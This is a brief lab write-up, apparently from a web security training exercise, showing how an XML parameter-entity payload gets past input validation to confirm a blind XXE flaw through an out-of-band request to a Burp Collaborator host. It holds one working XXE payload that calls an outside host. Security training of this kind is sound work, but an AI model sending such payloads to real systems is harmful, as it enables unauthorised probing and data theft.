If we try to perform a XXE attack, a security warning is displayed:
![](imgs/blind_xxe_bypass_input_validation_with_XML_parameter_entities.png)

In order to bypass this, we can use the XML parameter entities, that has this payload:
`<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://wffns0aemo7wmyf60b8vih5sdjjc76vv.oastify.com"> %xxe; ]>`

We can send this request:
![](imgs/blind_xxe_bypass_input_validation_with_XML_parameter_entities-1.png)

And Burp Collaborator displays the request:
![](imgs/blind_xxe_bypass_input_validation_with_XML_parameter_entities-2.png)